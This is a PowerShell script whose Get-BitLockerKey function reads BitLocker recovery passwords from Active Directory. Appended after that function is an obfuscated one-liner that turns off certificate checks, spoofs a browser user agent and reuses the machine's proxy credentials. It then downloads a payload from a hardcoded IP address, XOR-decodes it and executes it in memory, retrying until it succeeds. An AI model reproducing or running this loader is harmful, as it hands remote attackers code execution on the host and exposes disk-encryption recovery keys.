function Get-BitLockerKey {
    param (
        [string]$comp = $env:COMPUTERNAME
        
    )

    if (!$comp.endswith('$')) {
        $comp += '$'
    }

    $compsearcher = [adsisearcher]"samaccountname=$comp"
    $compsearcher.PageSize = 200
    $compsearcher.PropertiesToLoad.Add('name') | Out-Null
    $compobj = $compsearcher.FindOne().Properties

    if (!$compobj) {
        throw "$comp not found"
    }

    $keysearcher = [adsisearcher]'objectclass=msFVE-RecoveryInformation'
    $keysearcher.SearchRoot = [string]$compobj.adspath.trim()
    $keysearcher.PageSize = 200
    $keysearcher.PropertiesToLoad.AddRange(('name', 'msFVE-RecoveryPassword'))

    $keys = $keysearcher.FindOne().Properties
    if ($keys) {
            $keys | % {
            try{ rv matches -ea stop }catch{}
            ('' + $_.name) -match '^([^\{]+)\{([^\}]+)' | Out-Null
        
            $date = $Matches[1]
            $pwid = $Matches[2]
        
            New-Object psobject -Property @{
                Name = [string]$compobj.name
                Date = $date
                PasswordID = $pwid
                BitLockerKey = [string]$_.'msfve-recoverypassword'
            } | select name, date, passwordid, bitlockerkey
        }
    } else {
        New-Object psobject -Property @{
            Name = [string]$compobj.name
            Date = ''
            PasswordID = ''
            BitLockerKey = ''
        } | select name, date, passwordid, bitlockerkey
    }
}

$wc=NEW-ObJECT SySTEM.NET.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeaDErS.ADD('User-Agent',$u);$wc.PROXY = [SysTEM.NeT.WebREQuesT]::DeFAulTWEBPrOxy;$wc.PROXY.CReDEntiAlS = [SYSTem.NeT.CRedEnTiAlCachE]::DEfAuLTNeTwOrkCredenTIALS;$K='879526880aa49cbc97d52c1088645422';$R=5;DO{TRy{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOADSTRiNg("https://52.39.227.108:443/index.asp")))|%{$_-bXOr$K[$I++%$K.LENGth]};IEX ($B-JoIN''); $R=0;}caTCH{SleEp 5;$R--}} WHile ($R -GT 0)

